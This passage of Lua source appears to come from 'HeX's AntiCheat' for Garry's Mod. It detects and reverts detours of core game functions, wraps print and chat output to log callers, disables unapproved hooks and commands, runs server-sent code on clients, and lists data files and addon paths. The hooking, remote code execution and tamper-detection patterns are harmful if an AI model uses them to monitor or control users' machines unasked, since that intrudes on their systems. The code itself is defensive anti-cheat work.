		_R.File.Size = F_Size
	end
	if _R.File.Read != F_Read then
		DelayGMG("Detour3=F_Read["..FPath(_R.File.Read).."]")
		_R.File.Read = F_Read
	end
	if _R.Entity.FireBullets != NotBLT then
		DelayGMG("Detour3=FireBullets["..FPath(_R.Entity.FireBullets).."]")
		_R.Entity.FireBullets = NotBLT
	end
	
	if not NotRE( NotRGT(_G, "GetConVar"), NotGCV) then
		DelayGMG("Detour4=GetConVar")
	end
	if not NotRE( NotRGT(_G, "GetConVarString"), NotGCS) then
		DelayGMG("Detour4=GetConVarString")
	end
	if not NotRE( NotRGT(_G, "GetConVarNumber"), NotGCN) then
		DelayGMG("Detour4=GetConVarNumber")
	end
	if not NotRE( NotRGT(_G, "RunConsoleCommand"), NewRCC) then
		DelayGMG("Detour4=RunConsoleCommand")
	end
	if not NotRE( NotRGT(_G, "InjectConsoleCommand"), NotECC) then
		DelayGMG("Detour4=InjectConsoleCommand")
	end
	if not NotRE( NotRGT(concommand, "Run"), NotCCR) then
		DelayGMG("Detour4=NotCCR")
	end
	
	CheckPotato(NotDGE,					"NotDGE")
	CheckPotato(NotDGU,					"NotDGU")
	CheckPotato(NotCRC,					"NotCRC")
	CheckPotato(NotRPF,					"NotRPF")
	CheckPotato(NotTS,					"NotTS")
	CheckPotato(NotTC,					"NotTC")
	CheckPotato(NotPCC,					"NotPCC")
	CheckPotato(NotSEA,					"NotSEA")
	CheckPotato(NotSVA,					"NotSVA")
	CheckPotato(render.Capture,			"render.Capture")
	CheckPotato(file.Open,				"file.Open")
	CheckPotato(file.Find,				"file.Find")
	CheckPotato(file.Size,				"file.Size")
	CheckPotato(util.CRC,				"util.CRC")
	CheckPotato(util.Decompress,		"util.Decompress")
	CheckPotato(util.Compress,			"util.Compress")
	CheckPotato(util.TableToJSON,		"util.TableToJSON")
	CheckPotato(util.JSONToTable,		"util.JSONToTable")
	CheckPotato(util.Base64Encode,		"util.Base64Encode")
	CheckPotato(timer.Simple,			"timer.Simple")
	CheckPotato(timer.Create,			"timer.Create")
	CheckPotato(net.SendToServer,		"net.SendToServer")
	CheckPotato(net.WriteString,		"net.WriteString")
	CheckPotato(debug.getinfo,			"debug.getinfo")
	CheckPotato(debug.getregistry,		"debug.getregistry")
	CheckPotato(_R.Entity.FireBullets,	"FireBullets")
	CheckPotato(string.dump,			"string.dump")
	CheckPotato(table.insert,			"table.insert")
	
	if debug.getmetatable then
		DelayGMG("DGMT")
	end
end


HookAdd("HACBurst", function(Cont,len,sID,idx,Total)
	local HAC = {
		DelayGMG = DelayGMG,	FPath		= FPath,		EatThis = EatThis,
		HookCall = HookCall,	NotRCC		= NotRCC,		NotDGE	= NotDGE,
		NotDGU	 = NotDGU,		NotSMT		= NotSMT,		NotGMT	= NotGMT,
		NotRGT	 = NotRGT,		NotRST		= NotRST,		NotCRC	= NotCRC,
		NotRQ	 = NotRQ,		NotRS		= NotRS,		NotGCI	= NotGCI,
		NotCGB	 = NotCGB,		NotTS		= NotTS,		NotTC	= NotTC,
		NotMR	 = NotMR,		NotTIS		= NotTIS,		NotJUF	= NotJUF,
		NotRPF	 = NotRPF,		NotSEA		= NotSEA,		NotSVA	= NotSVA,
		NotSD	 = NotSD,		CheckPotato	= CheckPotato,	NotHP	= NotHP,
		NotSIW	 = NotSIW,		NotGMG		= NotGMG,		Read	= Read,
		NotFE	 = NotFE,		NotSX		= NotSX,		ConCon	= RunConsoleCommand,
		NotFF	 = NotFF,		NotFO		= NotFO,		F_Size 	= F_Size,
		F_Close	 = F_Close, 	F_Read 		= F_Read, 		F_Write = F_Write,
		NotFD	 = NotFD,		NotDGMT		= NotDGMT,		Format	= Format,
		pairs	 = pairs,		tostring 	= tostring, 	pcall	= pcall,
		_R		= _R
	}
	Cont = NotJTT(Cont)
	local ply = ""
	local CME = {}
		CME.CRC = NotCRC(Cont.Cont..Cont.Ras)
		CME.Ran,CME.Ret = GetPlayer(
			NotHP(Cont.Cont,Cont.Ras),
			function(self) if self then ply = self end end,HAC,Gun
		)
		CME.ply = ply
	CME = NotJST(CME)
	
	HookCall("HACBurst", CME, nil,nil,true)
end)


local Cannon = {}
local function CheckOven()
	for cmd,func in pairs(NotCGT) do
		if not (cmd and func) or func == OverrideCmd then continue end
		cmd = tostring(cmd)
		
		local path,line = FPath(func)
		local where = path..":"..line
		
		if not GoodCCA(cmd,where) then
			if not Cannon[cmd..where] then
				NotGMG("WCCA=", cmd,where)
				Cannon[cmd..where] = true
			end
			
			if not Silent or (NotFL(NotSL(cmd),"spam") or NotFL(NotSL(path),"spam")) then
				func 		= OverrideCmd
				NotCGT[cmd] = OverrideCmd
			end
			EatThis(path)
		end
	end
	
	for what,HTab in pairs(NotHH) do
		what = tostring(what)
		for k,v in pairs(HTab) do
			if not v or v == Useless then continue end
			local Idx_k = k
			k = tostring(k)
			
			local path,line = FPath(v)
			local where = path..":"..line
			if not GoodHook(what,k,where) then
				if not Cannon[what..k..where] then
					NotGMG("WHOOK=", what,k,where)
					Cannon[what..k..where] = true
				end
				
				if not Silent or (NotFL(NotSL(k),"spam") or NotFL(NotSL(where),"spam")) then
					v = Useless
					if Idx_k and NotHH[what] then NotHH[what][Idx_k] = Useless end
				end
				EatThis(path)
			end
		end
	end
	
	local Modules = _G._MODULES
	if type(Modules) == "table" then
		for k,v in pairs(Modules) do
			if not Lists.White_Modules[k] then
				DelayGMG("MODULE="..k)
				
				Modules[k] = nil
				if _G[k] then _G[k] = nil end
			end
		end
	end
	
	for k,v in pairs(_R) do
		if type(k) == "string" and NotFL(k,"LOADLIB:") then
			DelayGMG(k)
		end
	end
	
	for what,func in pairs(GAMEMODE) do
		if not func or func == Useless then continue end
		local path,line,kitten = FPath(func)
		if not kitten then continue end
		
		local where = path..":"..line
		if not GoodGM(what,where) then
			if not Cannon[what..where] then
				NotGMG("WGM=", what,where)
				Cannon[what..where] = true
			end
			
			if not Silent then
				func 			= Useless
				GAMEMODE[what]	= Useless
			end
			EatThis(path)
		end
	end
end

local function PreKR30()
	NotTS(12, PreKR30)
	
	KickRate30()
	CheckOven()
end
NotTS(15, PreKR30)


_G.swep 	= PreKR30
_G.NotFO	= NotFO
_G.NotFXE	= NotFXE
_G.NotFF	= NotFF
_G.NotFD	= NotFD
_G.NotDGU	= NotDGU

local function ThickCheck()
	if _G.NotFO != NotFO then
		DelayGMG("THK=NotFO ["..FPath(_G.NotFO).."]")
		_G.NotFO = NotFO
	end	
	
	if _G.NotFXE != NotFXE then
		DelayGMG("THK=NotFXE ["..FPath(_G.NotFXE).."]")
		_G.NotFXE = NotFXE
	end
	
	if _G.NotFF != NotFF then
		DelayGMG("THK=NotFF ["..FPath(_G.NotFF).."]")
		_G.NotFF = NotFF
	end
	
	if _G.NotFD != NotFD then
		DelayGMG("THK=NotFD ["..FPath(_G.NotFD).."]")
		_G.NotFD = NotFD
	end
	
	if _G.NotDGU != NotDGU then
		DelayGMG("THK=NotDGU ["..FPath(_G.NotDGU).."]")
		_G.NotDGU = NotDGU
	end
	
	if _G.GlobalPoop != NotGMG then
		DelayGMG("THK=GlobalPoop ["..FPath( _G.GlobalPoop).."]")
		_G.GlobalPoop = NotGMG
	end
	
	if _G.ConCon != RunConsoleCommand then
		DelayGMG("THK=ConCon ["..FPath(_G.ConCon).."]")
		_G.ConCon = RunConsoleCommand
	end
	
	table.Copy 	= TableCopy
	hook.Call	= NotHC
	hook.Add	= NotHA
end

NotTS(4, function()
	if not NotHH.Think then NotHH.Think = {} end
	NotHH.Think[ RandomChars() ] = ThickCheck
	CheckOven()
end)



local function VAString(Split, ...)
	local Tab 	= {...}
	local Out 	= ""
	local Out2 	= ""
	local Tot 	= select("#", ...)
	for k=1,Tot do
		Out  = Out..tostring( Tab[k] )..(k == Tot and "" or Split)
		Out2 = Out2.."[["..tostring( Tab[k] ).."]]"..(k == Tot and "" or ", ")
	end
	return Out,Out2
end


local function NewPRT(...)
	local Out,Out2 = VAString("\t", ...)
	local path,line = MyCall()
	if not Lists.White_PRT[ NotCRC(path) ] then
		NotGMG( Format("print(%s) [%s:%s]", Out2, path,line), NotCRC(path) ); EatThis(path)
	end	
	print(Out)
end
_G.print = NewPRT

local function NewMSG(...)
	local Out,Out2 = VAString("", ...)
	local path,line = MyCall()
	if not Lists.White_PRT[ NotCRC(path) ] then
		NotGMG( Format("Msg(%s) [%s:%s]", Out2, path,line), NotCRC(path) ); EatThis(path)
	end
	Msg(Out)
end
_G.Msg = NewMSG

local function NewMSN(...)
	local Out,Out2 = VAString("", ...)
	local path,line = MyCall()
	if not Lists.White_PRT[ NotCRC(path) ] then
		NotGMG( Format("MsgN(%s) [%s:%s]", Out2, path,line), NotCRC(path) ); EatThis(path)
	end
	MsgN(Out.."\n")
end
_G.MsgN = NewMSN

local NotCAT = chat.AddText
local function NewCAT(...)
	local Out2 = ""
	for k,v in pairs( {...} ) do
		if type(v) == "string" then
			Out2 = Out2.."[["..v.."]], "
		end
	end
	
	local path,line = MyCall()
	if not Lists.White_PRT[ NotCRC(path) ] then
		NotGMG( Format("chat.AddText(%s) [%s:%s]", Out2, path,line), NotCRC(path) ); EatThis(path)
	end
	NotCAT(...)
end
_G.chat.AddText = NewCAT


AddGroups()
DelayGMG("CGBCount", tostring(CGBCount) )
DelayGMG("GCICount", tostring(GCICount) )
DelayGMG("RCount", Bacon)
DelayGMG("GCount", Hose)
HookCall("LPT", LPT, nil,nil,true)
for k,v in pairs(Mail) do
	if not Lists.White_Package[v] then
		DelayGMG("Package="..tostring(v) )
	end
end

local Red 		= {r=255,g=0,  b=11, a=255}
local Green		= {r=66, g=255,b=96, a=255}
local Blue		= {r=51, g=153,b=255,a=255}
local Purple	= {r=255,g=0,  b=255,a=255}
HACInstalled = HACInstalled + 1
if not NotHH.InitPostEntity then NotHH.InitPostEntity = {} end
NotHH.InitPostEntity.Hooks = function()
	local HACLength = HACInstalled + #Lists
	local Init = HACKey + (HACInstalled * 2 / HACLength) + (HACLength + #NotGGM() + Hose) - Bacon
	
	DelayGMG("InitPostEntity", HACLength, Init, HACKey)
	
	local function RunAway()
		NotTS(30, RunAway)
		PreKR30()
		ThickCheck()
	end
	NotTS(9, RunAway)
	
	if not Silent then		
		MsgC(Red,		"\n///////////////////////////////////\n")
		MsgC(Red,		"//        ")
		MsgC(Blue,		"HeX's ")
		MsgC(Green,		"AntiCheat")
		MsgC(Red,		"        //\n")
		MsgC(Red,		"///////////////////////////////////\n")
		MsgC(Red,		"//     ")
		MsgC(Green,		"Pissing in the sandbox")
		MsgC(Red,		"    //\n")
		MsgC(Red,		"//           ")
		MsgC(Green,		"since '08")
		MsgC(Red,		"           //\n")
		MsgC(Red,		"///////////////////////////////////\n\n")
		
		MsgC(Purple,	HACCredits)
		
		MsgC(Blue,		'\n"These hack/anti-hack discussions are just dick measuring contests"\n')
		MsgC(Blue,		"HeX's is 7."..HACLength.." inches!\n\n")
	end
	
	RunConsoleCommand("gm_uh_enter_game_new", "UH DM", 1818, Init, Panties("Green"), HACKey)
	
	local p,l = "1337",1337
	local function CallMe(i) Init = Init + i; p,l = MyCall(2) end
	CallMe(Init)
	if not S_Path then DelayGMG("SPath", p,l,Init) end
end


/*
 ____  _____ ____ ___  _   _ ____    _____ ___ _     _____ 
/ ___|| ____/ ___/ _ \| \ | |  _ \  |  ___|_ _| |   | ____|
\___ \|  _|| |  | | | |  \| | | | | | |_   | || |   |  _|  
 ___) | |__| |__| |_| | |\  | |_| | |  _|  | || |___| |___ 
|____/|_____\____\___/|_| \_|____/  |_|   |___|_____|_____|
*/




local UselessData = {
	"data/friends_override.txt",
	"data/msteams_db.txt",
	"data/acf/menucolor.txt",
	"data/acf/revision.txt",
	"data/spacechat_options.txt",
	"data/smart_door.txt",
	"data/cdp_PaintLocations.txt",
	"data/test8995.txt",
	"data/impulse_maps.txt",
	"data/spaint.txt",
	"data/ttt_mapcycle.txt",
	"data/gb-radial-config-tools_2014.txt",
	"data/cs_shit.txt",
	"data/gungame-config.txt",
	"data/gb-radial-config_2014.txt",
	"data/progress_sao.txt",
	"data/cguisettingstwo.txt",
	"data/cguisettingsfive.txt",
	"data/cinema_config.txt",
	"data/hatlog.txt",
	"data/settings_sao.txt",
	"data/server_sessionid.txt",
	"data/chatsay.txt",
	"data/oldhash.txt",
	"data/Bowser.hat.txt",
	"data/ass_spconfig_client.txt",
	"data/kzss_config.txt",
	"data/queuemodechange.txt",
	"data/ev_globalvars_js.txt",
	"data/molotov_logs.txt",
	"data/LepRP_version.txt",
	"data/LepRP_weapons.txt",
	"data/weighting.txt",
	"data/ezi/ez_notif.txt",
	"data/model_precache_imp.txt",
	"data/riends_override.txt",
	"data/ai_prop_info_config.txt",
	"data/tt_detective.txt",
	"data/tscoreboard_config.txt",
	"data/icrp_buddies.txt",
	"data/ezi/ez_notifications.txt",
	"data/hgperp_buddies.txt",
	"data/sao_settings.txt",
	"data/anti-cheat.txt",
	"data/smartsnap_settings.txt",
	"data/gm_flatgrass .txt",
	"data/gcompute_ide_tabs.txt",
	"data/sandbox_mapcycle.txt",
	"data/advmpsettings.txt",
	"data/vMapVote_favorites.txt",
	"data/lemom_con_bl.txt",
	"data/gm_flatgrass.txt",
	"data/pacman.txt",
	"data/cbcbhop.txt",
	"data/pimptimes.txt",
	"data/gangwars_muted.txt",
	"data/PaperHud.txt",
	"data/glow_sawwarning.txt",
	"data/bannedprops.txt",
	"data/radio.txt",
	"data/maplist.txt",
	"data/fscache.txt",
	"data/saolvl.txt",
	"data/impactedhelp.txt",
	"data/swift128.txt",
	"data/friends_cache.txt",
	"data/zsfavoriteshopitems.txt",
	"data/dgchristmas.txt",
	"data/chathud_variables.txt",
	"data/custom_title.txt",
	"data/imp_intro.txt",
	"data/gb-radial-config-presets.txt",
	"data/noobonic/favprops.txt",
	"data/ulx_donate.txt",
	"data/NewAdmin/log.txt",
	"data/cars.txt",
	"data/restricted_weapons.txt",
	"data/mg_jukebox_cache.txt",
	"data/mg_jukebox_cache_version.txt",
	"data/mg_jukebox_favorites.txt",
	"data/jitheater/default.txt",
	"data/zinv_settings.txt",
	"data/blackbox/designs/fallout/color.txt",
	"data/ax.txt",
	"data/builder_props.txt",
	"data/improvedhud2/design.txt",
	"data/improvedhud2/options.txt",
	"data/improvedhud2/verision.txt",
	"data/sac_plugin_menus.txt",
	"data/spex_data.txt",
	"data/localdata/clientinfo.txt",
	"data/debugtime.txt",
	"data/dr_3f.txt",
	"data/dr_3r.txt",
	"data/sb_active.txt",
	"data/sb_volume.txt",
	"data/gb-radial-config-tools.txt",
	"data/gb-radial-config.txt",
	"data/scar_errorlog_sv.txt",
	"data/ug_cinema_config.txt",
	"data/vfs_cl.txt",
	"data/wyozimedia_pls_cli2.txt",
	"data/mapvote/config.txt",
	"data/wire_version.txt",
	"data/nadmod_config.txt",
	"data/prevhash.txt",
	"data/_playx_crash_detection.txt",
	"data/particle materials.txt",
	"data/ulx_motd.txt",
	"data/stargate.cvar.check.txt",
	"data/scarhud.txt",
	"data/scarkeybindings.txt",
	"data/scarradiochannels.txt",
	"data/scarcam.txt",
	"data/ev_globalvars.txt",
	"data/ass_config_client.txt",
	"data/hoverboards.txt",
	"data/smartsnap_offsets_custom.txt",
	"data/sharpeye_config_dump.txt",
	"data/fadmin/motd.txt",
	"data/particle_materials.txt",
	"data/toolgunmenu/data.txt",
	"data/toolgunmenu/tooldata.txt",
	"data/hud_settings.txt",
	"data/vChat/settings.von.txt",
	"data/vscoreboard/settings.von.txt",
	"data/atlaschat_config.txt",
	"data/scar_errorlog_cl.txt",
	"data/hera/log.txt",
	"data/Impacted.txt",
	"data/swift.txt",
	"data/ev_allentitiescache.txt",
	"data/ev_playerinfo.txt",
	"data/ev_userranks.txt",
	"data/check/won.txt",
	"data/workshop_tracker/targets.txt",
	"data/lemom_cmds.txt",
	"data/horrorstory/settings.txt",
	"data/mptv_history.txt",
	"data/pzs_savecart.txt",
	"data/breakableprops.txt",
	"data/ad2temp.txt",
	"data/ia_globalvars.txt",
	"data/climbswep2_convars.txt",
	"data/FQD_ZS_carts.txt",
	"data/crashpos_json.txt",
	"data/gauth_cl.txt",
	"data/scoreboard_config.txt",
	"data/tardis_locations.txt",
	"data/nnjg/jbrules.txt",
	"data/ARitzDDSettings.txt",
	"data/crashposition.txt",
	"data/stonedpotatoes_welcome.txt",
	"data/gibmod_models.txt",
	"data/nekres.txt",
	"data/gibmod/gibmod_enabled.txt",
	"data/gibmod/gibmod_enabledismemberment.txt",
	"data/gibmod/gibmod_enablegibbing.txt",
	"data/gibmod/gibmod_mingibs.txt",
	"data/_lpp_friends.txt",
	"data/contraptionListNew.txt",
	"data/default.txt",
	"data/gfyforum.txt",
	"data/ff_pnrp_tutorial.txt",
	"data/gfygroup.txt",
	"data/gfymotdv2.txt",
	"data/legit.txt",
	"data/lua_editor_save.txt",
	"data/players_saved.txt",
	"data/grenada/grenada.txt",
	"data/html/motd.txt",
	"data/manuals/spawned.txt",
	"data/ass_config_server.txt",
	"data/ass_rankings.txt",
	"data/gangwars_options.txt",
	"data/mxradio.txt",
	"data/mxradio_settings.txt",
	"data/sammyservers_textscreens.txt",
	"data/exsto_windows.txt",
	"data/ev_motd.txt",
	"data/ASSmod/motd.txt",
	"data/SBEP/keyconfig.txt",
	"data/ttt_menu_settings.txt",
	"data/my_cbpos13.txt",
	"data/BRASS_HUD_C.txt",
	"data/drp-ps-bans.txt",
	"data/drp-ps.txt",
	"data/gmp_intro.txt",
	"data/presets_json.txt",
	"data/rules.txt",
	"data/hl2survival/hints.txt",
	"data/hudnum.txt",
	"data/hudnum.txt",
	"data/nxnstorefavs.txt",
	"data/ray_damage.txt",
	"data/Callisto/callisto sec fire data.txt",
	"data/ups/friends.txt",
	"data/ev_globalvarsHON.txt",
	"data/particle_maker_materials.txt",
	"data/perp2_buddies.txt",
	"data/ass_debug_cl.txt",
	"data/smartsnap_custom_offsets.txt",
	"data/vein/logs/sql.txt",
	"data/zscarts.txt",
	"data/brom-admin/auto_login.txt",
	"data/damagelog_colours_13.txt",
	"data/hs_layout.txt",
	"data/alpha_testers.txt",
	"data/bugs.txt",
	"data/ea_version.txt",
	"data/Zmod/player.txt",
	"data/nn_data/nn_ytp_bookmarks.txt",
	"data/lemon_config.txt",
	"data/tt_no_rules.txt",
	"data/blinkswep_convars.txt",
	"data/sandbox_mapcycle.txt-1727956287",
	"data/exsto_mysql_settings.txt",
	"data/anti-cheat_logs/anti-cheat.txt",
	"data/exsto_plugin_settings.txt",
	"data/ev_log.txt",
	"data/ev_player_reports.txt",
	"data/gmz_invslots.txt",
	"data/caddons_data.txt",
	"data/ldrp_savetheme.txt",
	"data/inkie.txt",
	"data/connected_list.txt",
	"data/depthhud_inline.txt",
	"data/muted_list.txt",
	"data/fbans.txt",
	"data/1fw.txt",
	"data/account.txt",
	"data/kim.txt",
	"data/1fc.txt",
	"data/FACTION Default.txt",
	"data/firstmap.bat.txt",
	"data/mapcycle.move.txt",
	"data/forcedl.txt",
	"data/EventsLog.txt",
	
	"data/expmod/",
	"data/G-Stream/",
	"data/phluddbase/",
	"data/wireflash/",
	"data/hatschat/",
	"data/CAF_Debug/",
	"data/InventoryAddon/",
	"data/floodcashlogs/",
	"data/floodweapons/",
	"data/wep_data/",
	"data/craphead_scripts/",
	"data/heat/",
	"data/pinv/",
	"data/mod-128/",
	"data/mapvote/",
	"data/GibSplat/",
	"data/metrostroi_data/",
	"data/asm/",
	"data/advdupe2_maps/",
	"data/nz/",
	"data/npcspawner2/",
	"data/fish/",
	"data/ttt/maps/",
	"data/playerjoinlogger/",
	"data/LiquidDRP/",
	"data/relationswapper/",
	"data/map_decoration_editor/",
	"data/sv_hideandseek/",
	"data/pzs/",
	"data/ph13/",
	"data/esdata/",
	"data/wallet_db/",
	"data/hideandseek/",
	"data/Callisto/",
	"data/westernrp_textures/",
	"data/zs_loadouts/",
	"data/hologp/",
	"data/pixel_weapon/",
	"data/starfall/",
	"data/npcspawner/",
	"data/npcrelationships/",
	"data/gjail/",
	"data/nutscript/",
	"data/hitnumbers/",
	"data/homestuck/",
	"data/FAdmin/",
	"data/perma/",
	"data/Half-Life_2_Campaign/",
	"data/weapon_loadouts/",
	"data/mail/",
	"data/blackbox/designs/",
	"data/Expression 2/",
	"data/mtz_murder/",
	"data/particle/",
	"data/zsloadouts/",
	"data/noxctfspellsheet/",
	"data/gibmod/",
	"data/Morbus/logs/",
	"data/HAT/",
	"data/server/ghosthunters/",
	"data/Stargate/",
	"data/Rollercoasters/",
	"data/gmstranded/",
	"data/geolocation/",
	"data/kiritoservermail/",
	"data/gamesaves/",
	"data/vbtdm/",
	"data/d3a/stafflogs/",
	"data/dbugr/",
	"data/D3A/StaffLogs/",
	"data/EM_manuals/",
	"data/GMStranded/",
	"data/dbugr/cl_logs/",
	"data/murder/",
	"data/scareditorsaves/",
	"data/tf2pain/",
	"data/radwheel/",
	"data/FAdmin_logs/",
	"data/leifadmin/",
	"data/d3a/stafflogs/commands/",
	"data/faddons_savedata/",
	"data/pac3_editor/",
	"data/server_logs/",
	"data/faddons_savedata/",
	"data/sbep_manual/",
	"data/pac2_outfits/",
	"data/openaura/",
	"data/onslaught_saves/",
	"data/labyrinth/",
	"data/e2files/",
	"data/dmod/",
	"data/ctp/",
	"data/cityrp/",
	"data/chatlogs/",
	"data/WM-RTS/",
	"data/SPUChip/",
	"data/LeifAdmin/",
	"data/Holopad/",
	"data/HL2Survival/",
	"data/EGI_Data/",
	"data/E2Power/",
	"data/signbuilder/",
	"data/drone/users/",
	"data/swep_construction_kit/",
	"data/tdm/",
	"data/ulib/",
	"data/cap_fonts/",
	"data/improvedhud/",
	"data/ulx_logs/",
	"data/DarkRP_logs/",
	"data/loading_screen_data/",
	"data/zombiesurvival/",
	"data/lemongate/",
	"data/serverguard/",
	"data/FloodWeapons/",
	"data/FloodCashLogs/",
	"data/FloodBans/",
	"data/advdupe2/",
	"data/darkestdays/loadouts/",
	"data/redead/",
	"data/pzs_v3b/",
	"data/zmodserveroption/",
	"data/zmodworld/",
	"data/gmstranded/saves/",
	"data/zmod_global_options/",
	"data/unolimited/",
	"data/codzombies/",
	"data/r2k/",
	"data/srvlog/",
	"data/pac3/",
	"data/ttt/logs/",
	"data/robotboy655/",
	"data/ppm/",
	"data/gpuchip/",
	"data/expression2/",
	"data/glib/",
	"data/fadmin_logs/",
	"data/cpuchip/",
	"data/darkrp_logs/",
	"data/adv_duplicator/",
	"data/Expression2/",
	"data/ExpressionGate/",
	"data/stargate/",
	"data/profiler_premade/",
	"data/soundlists/",
	"data/zsprofiler/",
	"data/zsmaps/",
	"data/global_options/",
	"data/spuchip/",
	"data/damagelog/",
	"data/exsto/",
	"data/e2power/",
	"data/vchat/",
	"data/streamradio/",
	"data/ppm_cache/",
	"data/asslog/",
	"data/gmodz/",
	"data/persist/",
	"data/ev_logs/",
	"data/ASSMod/",
	"data/pill_config/",
	"data/achievements/",
	"data/rphone/",
	"data/pikaserver/",
	"data/ulx/",
	"data/luapad/",
	"data/GPUChip/",
	"data/CPUChip/",
	"data/radio/",
	"data/playx/",
	"data/StarfallScriptData/",
	"data/ez_rollercoaster/",
	"data/tiramisu/",
	"data/lde_logs/",
	"data/jcdata/",
	"data/aowl/",
	"data/sentmail/",
	"data/ULib/",
	"data/nodegraph/",
	"data/wrench/",
	"data/youtube player/",
}


local Useless = {
	"addons/neuroweapons/Lua",
	"addons/chatsounds/lua/",
	"addons/NextBot Players/lua/",
	"addons/cap_resources-master/",
	"addons/Addons-Repo/",
	"addons/Gedo789-S1/lua/",
	"addons/SpaceBuild-REPO/lua/",
	"addons/SpaceSoldier/lua/",
	"addons/streamradio_core/",
	"addons/DerpRP Inv/lua/",
	"addons/darkrpmodification/lua/",
	"addons/Gassystems2/",
	"addons/evolve/",
	"addons/Spacevult/",
	"addons/spacebuild/",
	"addons/ttt-weapon-collection-master/",
	"addons/sb/",
	"addons/cap/",
	"addons/Spacebuild 3/",
	"addons/Spacebuild 2/",
	"addons/Sbep (Spacebuild Props)/",
	"addons/Pcmod2/lua/",
	"addons/TrainPilot/lua/",
	"addons/FPP/lua/",
	"addons/ULib/lua/",
	"addons/Pcmod2/lua/",
	"addons/Lucario/lua/",
	"addons/Dismemberment Mod 1.9/lua/",
	"addons/Neuro Planes/lua/",
	"addons/E2Power/lua/",
	"addons/vfs/lua/",
	"addons/NeuroTec Weapons/lua/",
	"addons/Wire Mod/lua/",
	"addons/pac 3/lua/",
	"addons/Bots/lua/",
	"addons/StargateFreaks%20Pack/lua/",
	"addons/PlayX/lua/",
	"addons/streamradio_core/",
	"SweetFX/",
	"SweetFX readme.txt",
	"SweetFX_preset.txt",
	"SweetFX_settings.txt",
	"addons/finalfrontier-master/lua/",
	"addons/Adv. HUD Indicator/",
	"addons/900 sub pack by TheDanishMaster/lua/",
	"addons/500 sub pack by TheDanishMaster/lua/",
	"addons/Portal 2 Content Addon/scripts/",
	"addons/Quality Rp Vehicle Pack/lua/",
	"addons/Fueled Mod Vehicle Pack/lua/",
	"addons/Sonic Playermodels  V3/lua/",
	"addons/Aperture Science Handheld Portal Device/lua/",
	"addons/Futuristic Weaponry Npc Weapons/lua/",
	"addons/Neo Heavy Combine player model and npc Pack/lua/",
	"addons/gamemodes/Half-Life/",
	"addons/evo1m/lua/",
	"addons/Garry's Mod Stranded/",
	"lua/gengeolightdb.lua",
	"lua/gengeolightdb2.lua",
	"lua/streamradio_core/",
	"addons/dcpu_emulator/lua/",
	"addons/SLV_Base/lua/",
	"addons/addons/Half-Life_Renaissance/lua",
	"addons/Teletubies/lua/",
	"addons/M9K Specialties/lua/",
	"addons/ULX/lua/",
	"addons/Call of Duty SWeps/lua/",
	"addons/SCars Slim/lua/",
	"addons/Minecraft Skin Changer/lua/",
	"addons/SCars Extra/lua/",
	"addons/WAC Aircraft/lua/",
	"addons/WAC Community 6/lua/",
	"addons/XCF/",
	"addons/sbep/",
	"addons/Ulib/lua/",
	"addons/Nuke Pack 4/lua/",
	"addons/Working Combine-Mech/",
	"addons/Hoverboards/",
	"addons/GDCW BARRETT Weaponry/lua/",
	"addons/ACF.git/",
	"addons/spacebuild-master/lua/",
	"addons/finalfrontier-master/",
	"addons/Wireextra/lua/",
	"addons/stargate/example gates/",
	"addons/GDCW/lua/",
	"addons/stargate/lua/",
	"addons/pac3-hatmaker/lua/",
	"addons/PAC3/lua/",
	"lua/sui_scoreboard/",
	"lua/caf/languagevars/",
	"lua/data/stargate/",
	"addons/cap_resources-master/lua/",
	"addons/TDM Cars/lua/",
	"addons/gravityhull/lua/",
	"addons/rx_achievement_system/",
	"addons/assmod/",
	"addons/gm-rollercoaster-master/",
	"addons/SBEP Entities/lua/",
	"addons/TDM Dealer/lua/",
	"addons/SBEP Experimental/lua/",
	"addons/Hard Reset Vehicles/lua/",
	"addons/TDM cars/lua/",
	"lua/lemongate/components/",
	"lua/lemongate/editor/",
	"lua/pac3/editor/",
	"lua/data/language/",
	"lua/pac3/pace/",
	"lua/pac3/core/",
	"addons/Drivable Scania Trucks by TheDanishMaster/lua/",
	"addons/Trailer pack by TheDanishMaster/lua/",
	"addons/MandracsModels/lua/",
	"addons/Minecraft/lua/",
	"addons/Content pack/lua/",
	"addons/SpaceBuild3/lua/",
	"addons/bf3sweps/lua/",
	"addons/DoctorWho/Lua/",
	"addons/CM901/lua/",
	"addons/MK46/lua/",
	"addons/MP412/lua/",
	"addons/MP9/lua/",
	"addons/P99/lua/",
	"addons/PM-9/lua/",
	"addons/PP90M1/lua/",
	"addons/assmod/lua/",
	"addons/Elevator/",
	"lua/caf/addons/",
	"lua/caf/core/",
	"lua/items/trails/",
	"lua/items/headshatsmasks/",
	"lua/items/playermodels/",
	"lua/caf/stools/",
	"addons/SicknessModel/lua/",
	"addons/SCars/lua/",
	"addons/Wire Mod Extras/lua/",
	"addons/lua/stargate/",
	"addons/gamemodes/fretta/",
	"addons/gamemodes/prop_hunt/",
	"addons/Spacebuild Mod 3/",
	"lua/data/expression2/",
	"lua/data/gatespawner_group_maps/",
	"lua/data/gatespawner_maps/",
	"addons/cap-master/example gates/",
	"addons/lua/data/language/",
	"addons/lua/data/gatespawner_group_maps/",
	"addons/lua/data/gatespawner_maps/",
	"addons/wiremod123/lua/",
	"addons/TDMCarpack/lua/",
	"addons/Advduplicator/lua/",
	"addons/Windeds Video Assistant/lua/",
	"addons/HeX's DepthHUD/lua/",
	"addons/HeX's SaitoHUD/lua/",
	"addons/ACF/lua/",
	"addons/acf/lua/",
	"addons/RagMorph/lua/",
	"addons/GComputeother/lua/",
	"addons/ACF.git/lua/",
	"addons/gcompute/lua/",
	"addons/glib/lua/",
	"addons/cap-master/lua/",
	"addons/gvote/lua/",
	"addons/gooey/lua/",
	"addons/chatsoundsforgmod/lua/",
	"addons/TDM/lua/",
	"addons/DarkRP/",
	"lua/data/language/",
	"addons/ACF mod/lua/",
	"addons/master/lua/effects/",
	"addons/master/lua/entities/",
	"addons/master/lua/weapons/",
	"addons/master/lua/wire/",
	"addons/Morbus Gamemode/",
	"addons/ACF_custom/",
	"addons/Angry Hobo SWEP/",
	"addons/livecontenthack/lua",
	"addons/LiveContentHack/lua",
	"addons/PointShop-Extras/",
	"lua/entities/",
	"lua/effects/",
	"lua/weapons/",
	"lua/Weapons/",
	"lua/weapons_old/",
	"lua/weaponsold/",
	"lua/includes/gamemode/",
	"lua/includes/gamemodes/",
	"lua/gamemodes/",
	"lua/includes/lua/effects/",
	"lua/includes/lua/entities/",
	"lua/includes/lua/weapons/",
	"lua/wire/",
	"lua/autorun/server/AdvDupe",
	"lua/autorun/shared/dupeshare",
	"lua/slvbase_init/",
	"lua/hlr_init/",
	"lua/playx/",
	"lua/pcmod/",
